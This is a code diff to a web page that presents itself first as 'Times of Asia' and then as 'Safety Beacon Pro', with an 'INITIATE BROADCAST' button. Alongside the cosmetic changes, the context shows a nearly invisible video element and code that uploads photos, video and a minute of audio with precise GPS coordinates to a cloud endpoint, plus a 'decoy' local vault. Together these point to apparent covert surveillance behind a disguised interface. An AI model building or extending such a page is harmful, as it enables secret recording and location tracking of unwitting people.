@@ -9,9 +9,11 @@
         .box { max-width: 380px; margin: 0 auto; background: #141414; padding: 25px 20px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
         h2 { font-size: 22px; font-weight: 600; margin: 0 0 5px 0; letter-spacing: -0.5px; }
         .subtitle { font-size: 12px; color: #777; margin: 0 0 25px 0; }
+        
+        /* 🔴 REPAIRED: Dark crimson gradient button with zero white borders */
         .round-3d-btn {
-            background: linear-gradient(135deg, #e63946 0%, #b22222 100%);
-            border: 4px solid #fff;
+            background: linear-gradient(135deg, #8b0000 0%, #4a0000 100%);
+            border: none !important; /* Completely stripped the white circle line */
             border-radius: 50% !important;
             width: 190px;
             height: 190px;
@@ -23,18 +25,26 @@
             cursor: pointer;
             display: block;
             outline: none;
-            box-shadow: 0 12px 0 #7f1d1d, 0 15px 20px rgba(0, 0, 0, 0.6), inset 0 4px 4px rgba(255, 255, 255, 0.3);
+            /* Multi-layered dark recess shadowing to simulate depth */
+            box-shadow: 0 12px 0 #3a0000, 
+                        0 20px 30px rgba(0, 0, 0, 0.9), 
+                        inset 0 4px 6px rgba(255, 255, 255, 0.1),
+                        inset 0 -8px 16px rgba(0, 0, 0, 0.6);
             transition: all 0.05s ease;
             position: relative;
             top: 0;
             -webkit-tap-highlight-color: transparent;
         }
+        
+        /* Active pressed state depth alteration */
         .round-3d-btn.active-press {
-            background: linear-gradient(135deg, #1d3557 0%, #132239 100%);
-            box-shadow: 0 2px 0 #0b1523, 0 4px 8px rgba(0, 0, 0, 0.5), inset 0 4px 8px rgba(0, 0, 0, 0.6);
-            border-color: #a8dadc;
+            background: linear-gradient(135deg, #132239 0%, #0b1523 100%);
+            box-shadow: 0 2px 0 #050b12, 
+                        0 6px 12px rgba(0, 0, 0, 0.8), 
+                        inset 0 6px 12px rgba(0, 0, 0, 0.9);
             top: 10px;
         }
+        
         #status { margin-top: 30px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
         #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         canvas { display: none; }
@@ -51,7 +61,7 @@
 </head>
 <body>
 <div class="box">
-    <h2>Times of Asia</h2>
+    <h2>Safety Beacon Pro</h2>
     <div class="subtitle">Tactile Dual-Vector Sync Engine</div>
     <button id="sosBtn" class="round-3d-btn" onclick="toggleEmergencyBroadcast()">🚨 INITIATE<br>BROADCAST</button>
     <div id="status">System armed and ready for tactical deployment...</div>
@@ -164,12 +174,11 @@
             transmitPacketToCloud({ 
                 type: "photo", 
                 image: base64Str, 
-                LAT: currentLat, 
-                LON: currentLon, 
+                latitude: currentLat, 
+                longitude: currentLon, 
                 accuracy: gpsAccuracy, 
                 timestamp: cleanTime 
             });
-            // 🔄 FIXED DISPLAY KEYS: Replaced Lt and Lg with the requested LAT and LON parameters
             saveToDecoyLocalVault("Photo_" + cleanTime + ".jpg", "LAT[" + currentLat + "] LON[" + currentLon + "] ac[" + gpsAccuracy + "m]");
         } catch (e) {}
     }
@@ -191,8 +200,8 @@
                     transmitPacketToCloud({ 
                         type: "video", 
                         videoData: reader.result.substring(reader.result.indexOf(',') + 1), 
-                        LAT: currentLat, 
-                        LON: currentLon, 
+                        latitude: currentLat, 
+                        longitude: currentLon, 
                         accuracy: gpsAccuracy, 
                         timestamp: cleanTime 
                     });
@@ -220,8 +229,8 @@
                     transmitPacketToCloud({ 
                         type: "video", 
                         videoData: reader.result.substring(reader.result.indexOf(',') + 1), 
-                        LAT: currentLat, 
-                        LON: currentLon, 
+                        latitude: currentLat, 
+                        longitude: currentLon, 
                         accuracy: gpsAccuracy, 
                         timestamp: cleanTime + "_FullMinuteAUDIO" 
                     });
